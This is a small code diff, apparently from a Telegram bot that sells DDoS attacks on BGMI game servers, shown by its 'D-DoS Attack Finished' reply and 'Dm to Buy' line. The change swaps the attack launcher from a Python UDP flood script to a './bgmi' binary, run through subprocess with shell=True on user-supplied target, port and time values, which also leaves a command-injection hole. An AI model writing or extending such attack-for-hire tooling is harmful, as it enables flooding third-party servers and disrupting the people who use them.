@@ -405,7 +405,7 @@ def initialize_bot(bot, bot_id):
                 else:
                     log_command(user_id, target, port, time, '/bgmi')
                     start_attack_reply(message, target, port, time)  
-                    full_command = f"python3 attack.py UDP {target}:{port} 900 {time} 1"
+                    full_command = f"./bgmi {target} {port} {time} 900"
                     subprocess.run(full_command, shell=True)
                     response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {time} Seconds\n\n👛Dm to Buy : {owner_name}"
             else:
